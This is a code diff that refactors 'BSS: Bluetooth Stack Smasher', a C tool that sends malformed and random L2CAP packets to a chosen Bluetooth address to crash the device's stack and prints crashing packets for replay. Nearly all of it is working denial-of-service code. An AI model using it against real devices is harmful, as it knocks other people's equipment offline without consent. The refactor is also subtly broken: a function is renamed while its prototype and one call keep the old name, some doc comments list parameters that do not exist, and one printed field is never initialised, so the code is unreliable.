@@ -53,172 +53,204 @@ void l2dos(char *, int, int, char);
 void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
 char *code2define(int code);
 
-void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
+/**
+ * Function to perform L2CAP fuzz testing.
+ *
+ * This function establishes a raw L2CAP socket, binds, and connects to a specified Bluetooth device.
+ * It then constructs a packet with specified size and padding, and sends it multiple times to the target.
+ * The function also includes error handling and displays relevant information if a crash is suspected.
+ *
+ * @param bdstr_addr Address of the target Bluetooth device as a string.
+ * @param cmdnum L2CAP command number to use for fuzzing.
+ * @param siz Size of the packet to be sent.
+ * @param pad Character to use for padding the packet; if 0, the padding byte will be 0x41.
+ */
+void l2dos(char *bdstr_addr, int cmdnum, int packet_size, char padding_char)
 {
-	char *buf;
-	l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
-	struct sockaddr_l2 addr;
-	int sock, i, id;
-	char *strcode = NULL;
+	char *buffer;
+	l2cap_cmd_hdr *command_header;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
+	struct sockaddr_l2 socket_address;
+	int socket_descriptor, iteration, identifier;
+	char *command_string = NULL;
 	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+	if ((socket_descriptor = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
 		perror("socket");
 		exit(EXIT_FAILURE);
 	}
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+	memset(&socket_address, 0, sizeof(socket_address));
+	socket_address.l2_family = AF_BLUETOOTH;
+	if (bind(socket_descriptor, (struct sockaddr *) &socket_address, sizeof(socket_address)) < 0) {
 		perror("bind");
 		exit(EXIT_FAILURE);
 	}
 
-	str2ba(bdstr_addr, &addr.l2_bdaddr);
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+	str2ba(bdstr_addr, &socket_address.l2_bdaddr);
+	if (connect(socket_descriptor, (struct sockaddr *) &socket_address, sizeof(socket_address)) < 0) {
 		perror("connect");
 		exit(EXIT_FAILURE);
 	}
 
-	if(!(buf = (char *) malloc ((int) siz))) {
+	if(!(buffer = (char *) malloc ((int) packet_size))) {
 		perror("malloc");
 		exit(EXIT_FAILURE);
 	}
 
-	for(i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
+	for(iteration = L2CAP_CMD_HDR_SIZE; iteration < packet_size; iteration++)
 	{
-		if( pad == 0 )
-			buf[i] = 0x41;		/* Default padding byte */
+		if(padding_char == 0)
+			buffer[iteration] = 0x41;		/* Default padding byte */
 		else
-			buf[i] = pad;
+			buffer[iteration] = padding_char;
 	}
 	
-	fprintf(stdout, "size = %d\n",siz);
-	strcode = code2define(cmdnum);
-	if(strcode == NULL)
+	fprintf(stdout, "size = %d\n", packet_size);
+	command_string = code2define(cmdnum);
+	if(command_string == NULL)
 	{
 		perror("L2CAP command unknown");
 		exit(EXIT_FAILURE);
 	}
 	else
-		fprintf(stdout, "Performing \"%s\" fuzzing...\n",strcode);
+		fprintf(stdout, "Performing \"%s\" fuzzing...\n", command_string);
 
-	for(i = 0; i < IT; i++){			// Send IT times the packet thru the air
-		cmd = (l2cap_cmd_hdr *) buf;
-		cmd->code = cmdnum;
-		cmd->ident = (i%250) + 1;		// Identificator 
-		cmd->len = __cpu_to_le16(LENGTH);
+	for(iteration = 0; iteration < IT; iteration++){			// Send IT times the packet thru the air
+		command_header = (l2cap_cmd_hdr *) buffer;
+		command_header->code = cmdnum;
+		command_header->ident = (iteration%250) + 1;		// Identifier 
+		command_header->len = __cpu_to_le16(LENGTH);
 
 		putchar('.');
 		fflush(stdout);
 		
-		if(send(sock, buf, siz?siz:MAXSIZE, 0) <= 0)
+		if(send(socket_descriptor, buffer, packet_size ? packet_size : MAXSIZE, 0) <= 0)
 		{
-			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
+			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, command_string);
 			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
 			fprintf(stdout, "\t ----------------------------------------------------\n");
 			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
-			fprintf(stdout, "\t Code field\t%s\n", strcode);
-			fprintf(stdout, "\t Ident field\t%d\n", id);
+			fprintf(stdout, "\t Code field\t%s\n", command_string);
+			fprintf(stdout, "\t Ident field\t%d\n", identifier);
 			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
-			fprintf(stdout, "\t Packet size\t%d\n", siz);
+			fprintf(stdout, "\t Packet size\t%d\n", packet_size);
 			fprintf(stdout, "\t ----------------------------------------------------\n");
 		}
-		if(++id > 254)
-			id = 1;
+		if(++identifier > 254)
+			identifier = 1;
 	}
 
-	free(strcode);	
+	free(command_string);	
 }
 
-void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
+/**
+ * l2fuzz - Send random L2CAP packets to a Bluetooth device, potentially causing crashes.
+ *
+ * @bdstr_addr: Bluetooth device address to send packets to (as a string).
+ * @maxsize: Maximum size of the random packets.
+ * @maxcrash: Maximum number of crashes to allow before exiting.
+ *
+ * This function continuously sends random L2CAP packets of varying size (up to maxsize)
+ * to the specified Bluetooth device. If the device crashes (evidenced by send() failing),
+ * it prints information about the crash and the packet that caused it. The function exits
+ * after maxcrash crashes have been detected or if maxcrash is set to 0, it runs indefinitely.
+ *
+ * It requires the Bluetooth device's address to be passed as a string in bdstr_addr.
+ * The function binds a socket to the Bluetooth adapter, connects to the specified device,
+ * then enters an infinite loop where it sends random data.
+ */
+void l2fuzz(char *device_address, int max_packet_size, int crash_limit)
 {
-	char *buf, *savedbuf;
-	struct sockaddr_l2 addr;
-	int sock, i, size;
-	int crash_count=0, savedsize;
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+	char *packet_buffer, *last_packet_buffer;
+	struct sockaddr_l2 device_address_struct;
+	int socket_fd, i, packet_size;
+	int crash_count = 0, last_packet_size;
+
+	if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
 		perror("socket");
 		exit(EXIT_FAILURE);
 	}
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+	memset(&device_address_struct, 0, sizeof(device_address_struct));
+	device_address_struct.l2_family = AF_BLUETOOTH;
+	if (bind(socket_fd, (struct sockaddr *) &device_address_struct, sizeof(device_address_struct)) < 0) {
 		perror("bind");
 		exit(EXIT_FAILURE);
 	}
 
-	str2ba(bdstr_addr, &addr.l2_bdaddr);
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+	str2ba(device_address, &device_address_struct.l2_bdaddr);
+	if (connect(socket_fd, (struct sockaddr *) &device_address_struct, sizeof(device_address_struct)) < 0) {
 		perror("connect");
 		exit(EXIT_FAILURE);
 	}
 
-	if(!(savedbuf = (char *) malloc ((int) maxsize + 1))) {
+	if (!(last_packet_buffer = (char *) malloc ((int) max_packet_size + 1))) {
 		perror("malloc");
 		exit(EXIT_FAILURE);
 	}
 
-	while(1)		// Initite loop (ctrl-c to stop...)
+	while (1)
 	{
-		size=rand() % maxsize;
-		if(size == 0) 
-			size=1;
-		if(!(buf = (char *) malloc ((int) size + 1))) {
+		packet_size = rand() % max_packet_size;
+		if (packet_size == 0) 
+			packet_size = 1;
+		if (!(packet_buffer = (char *) malloc ((int) packet_size + 1))) {
 			perror("malloc");
 			exit(EXIT_FAILURE);
 		}
 
-		bzero(buf, size);
-		for(i=0 ; i<size ; i++)	
-			buf[i] = (char) rand();
+		bzero(packet_buffer, packet_size);
+		for (i = 0; i < packet_size; i++)	
+			packet_buffer[i] = (char) rand();
 		
 		putchar('.');
 		fflush(stdout);
-		
-		if(send(sock, buf, size, 0) <= 0)
-		{
+
+		if (send(socket_fd, packet_buffer, packet_size, 0) <= 0) {
 			crash_count++;
-			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bdstr_addr);
+			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", device_address);
 			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
 			fprintf(stdout, "\t----------------------------------------------------\n");
-			fprintf(stdout, "\tHost\t\t%s\n", bdstr_addr);
-			fprintf(stdout, "\tPacket size\t%d\n", savedsize);
+			fprintf(stdout, "\tHost\t\t%s\n", device_address);
+			fprintf(stdout, "\tPacket size\t%d\n", last_packet_size);
 			fprintf(stdout, "\t----------------------------------------------------\n");
 			fprintf(stdout, "\tPacket dump\n\t");
-			for(i=0 ; i<savedsize ; i++)
-			{
-				fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[i]);
-				if( (i%30) == 29)
+			for (i = 0; i < last_packet_size; i++) {
+				fprintf(stdout, "0x%.2X ", (unsigned char) last_packet_buffer[i]);
+				if ((i % 30) == 29)
 					fprintf(stdout, "\n\t");
 			}
 			fprintf(stdout, "\n\t----------------------------------------------------\n");
 
 			fprintf(stdout, "char replay_buggy_packet[]=\"");
-			for(i=0 ; i<savedsize ; i++)
-			{
-				fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[i]);
+			for (i = 0; i < last_packet_size; i++) {
+				fprintf(stdout, "\\x%.2X", (unsigned char) last_packet_buffer[i]);
 			}
 			fprintf(stdout, "\";\n");
 
-			if((crash_count == maxcrash) && (maxcrash != 0) && (maxcrash >= 0))
-			{
-				free(buf);
-				free(savedbuf);
+			if ((crash_count == crash_limit) && (crash_limit != 0) && (crash_limit >= 0)) {
+				free(packet_buffer);
+				free(last_packet_buffer);
 				exit(EXIT_SUCCESS);
 			}
-			
 		}
-		memcpy(savedbuf, buf, size);	// Get the previous packet, not this one...
-		savedsize = size;
-		free(buf);
+		memcpy(last_packet_buffer, packet_buffer, packet_size); // Get the previous packet, not this one...
+		last_packet_size = packet_size;
+		free(packet_buffer);
 	}
 }
 
-int usage(char *name)
+/**
+ * usage - Prints the usage information of the Bluetooth Stack Smasher (BSS) tool and exits the program.
+ * @executableName: The name of the executable (typically argv[0]).
+ *
+ * This function prints out the usage information, including the different modes available for 
+ * the tool, and how to use its arguments. After printing the information, the function exits 
+ * the program with a failure status.
+ */
+int usage(char *executableName)
 {
 	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
-	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", name);
+	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", executableName);
 	fprintf(stderr, "Modes are :\n	\
 			0  ALL MODES LISTED BELOW\n	\
 			1  L2CAP_COMMAND_REJ\n	\
@@ -237,65 +269,89 @@ int usage(char *name)
 }
 
 
-char *code2define(int code)
+/**
+ * Converts a given L2CAP code to its corresponding string definition.
+ *
+ * This function takes an integer code representing an L2CAP message type 
+ * and returns a dynamically allocated string describing the type. 
+ * If the code is not recognized, it returns NULL.
+ *
+ * @param l2cap_code The L2CAP code to be converted to a string.
+ * @return A pointer to a dynamically allocated string containing the 
+ *         description of the L2CAP code, or NULL if the code is not recognized.
+ */
+char *convert_l2cap_code_to_string(int l2cap_code)
 {
-	char *strcode= malloc(BUFCODE + 1);
-	switch(code)
+	char *l2cap_code_string = malloc(BUFCODE + 1);
+	switch(l2cap_code)
 	{
 		case L2CAP_ECHO_REQ:
-			strcpy(strcode, "L2CAP echo request");	
+			strcpy(l2cap_code_string, "L2CAP echo request");	
 			break;
 
 		case L2CAP_COMMAND_REJ:
-			strcpy(strcode, "L2CAP command reject");	
+			strcpy(l2cap_code_string, "L2CAP command reject");	
 			break;
 			
 		case L2CAP_CONN_REQ:
-			strcpy(strcode, "L2CAP connection request");	
+			strcpy(l2cap_code_string, "L2CAP connection request");	
 			break;
 			
 		case L2CAP_CONN_RSP:
-			strcpy(strcode, "L2CAP connexion response");	
+			strcpy(l2cap_code_string, "L2CAP connection response");	
 			break;
 			
 		case L2CAP_CONF_REQ:
-			strcpy(strcode, "L2CAP configuration request");	
+			strcpy(l2cap_code_string, "L2CAP configuration request");	
 			break;
 			
 		case L2CAP_CONF_RSP:
-			strcpy(strcode, "L2CAP configuration response");	
+			strcpy(l2cap_code_string, "L2CAP configuration response");	
 			break;
 			
 		case L2CAP_DISCONN_REQ:
-			strcpy(strcode, "L2CAP disconnection request");	
+			strcpy(l2cap_code_string, "L2CAP disconnection request");	
 			break;
 			
 		case L2CAP_DISCONN_RSP:
-			strcpy(strcode, "L2CAP disconnection response");	
+			strcpy(l2cap_code_string, "L2CAP disconnection response");	
 			break;
 			
 		case L2CAP_ECHO_RSP:
-			strcpy(strcode, "L2CAP echo response");	
+			strcpy(l2cap_code_string, "L2CAP echo response");	
 			break;
 			
 		case L2CAP_INFO_REQ:
-			strcpy(strcode, "L2CAP info request");	
+			strcpy(l2cap_code_string, "L2CAP info request");	
 			break;
 			
 		case L2CAP_INFO_RSP:
-			strcpy(strcode, "L2CAP info response");	
+			strcpy(l2cap_code_string, "L2CAP info response");	
 			break;
 			
 		default:
-			strcode=NULL;
+			free(l2cap_code_string);
+            l2cap_code_string = NULL;
 	}
-	return strcode;
+	return l2cap_code_string;
 }
 
+/**
+ * @brief Main function to run the Bluetooth device test tool.
+ *
+ * This function initializes variables, checks for root privileges, parses command-line arguments,
+ * and calls specific testing functions based on the parsed mode. It targets a Bluetooth device
+ * for various testing operations, potentially causing it to crash with malformed packets.
+ *
+ * @param argc Number of arguments passed to the program.
+ * @param argv Array of argument strings.
+ *
+ * @return EXIT_SUCCESS on successful execution, otherwise exits with a failure status.
+ */
 int main(int argc, char **argv)
 {
-	int i, siz = 0, mode = 0, maxcrash=1;
-	char bdaddr[20], pad=0;
+	int arg_index, size = 0, test_mode = 0, max_crashes = 1;
+	char bluetooth_address[20], padding = 0;
 
 	if(getuid() != 0)
 	{
@@ -308,44 +364,43 @@ int main(int argc, char **argv)
 		usage(argv[0]);
 	}
 	
-	for(i = 0; i < argc; i++){
-		if(strchr(argv[i], ':'))
-			strncpy(bdaddr, argv[i], 18);
+	for(arg_index = 0; arg_index < argc; arg_index++){
+		if(strchr(argv[arg_index], ':'))
+			strncpy(bluetooth_address, argv[arg_index], 18);
 		else
 		{
-		if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
-			usage(argv[0]);
+			if(!memcmp(argv[arg_index], "-s", 2) && (size = atoi(argv[++arg_index])) < 0)
+				usage(argv[0]);
 		
-		if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
-			usage(argv[0]);
+			if(!memcmp(argv[arg_index], "-m", 2) && (test_mode = atoi(argv[++arg_index])) < 0)
+				usage(argv[0]);
 		
-		if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
-			usage(argv[0]);
+			if(!memcmp(argv[arg_index], "-p", 2) && (padding = (*argv[++arg_index])) < 0)
+				usage(argv[0]);
 		
-		if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
-			usage(argv[0]);
-
+			if(!memcmp(argv[arg_index], "-M", 2) && (max_crashes = atoi(argv[++arg_index])) < 0)
+				usage(argv[0]);
 		}
 	}
 
-	if(mode > 12)
+	if(test_mode > 12)
 	{
 		usage(argv[0]);
 		exit(EXIT_FAILURE);
 	}
 
-	if(mode == 0)
+	if(test_mode == 0)
 	{
-		for(i=1; i <= 0x0b; i++)
-			l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);
-		l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
+		for(arg_index = 1; arg_index <= 0x0b; arg_index++)
+			l2dos(bluetooth_address, arg_index, size ? size : MAXSIZE, padding);
+		l2fuzz(bluetooth_address, size ? size : MAXSIZE, max_crashes);
 	}
 	else
 	{
-		if(mode <= 11)
-			l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);
-		if(mode == 12)
-			l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
+		if(test_mode <= 11)
+			l2dos(bluetooth_address, test_mode, size ? size : MAXSIZE, padding);
+		if(test_mode == 12)
+			l2fuzz(bluetooth_address, size ? size : MAXSIZE, max_crashes);
 	}
 	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
 	
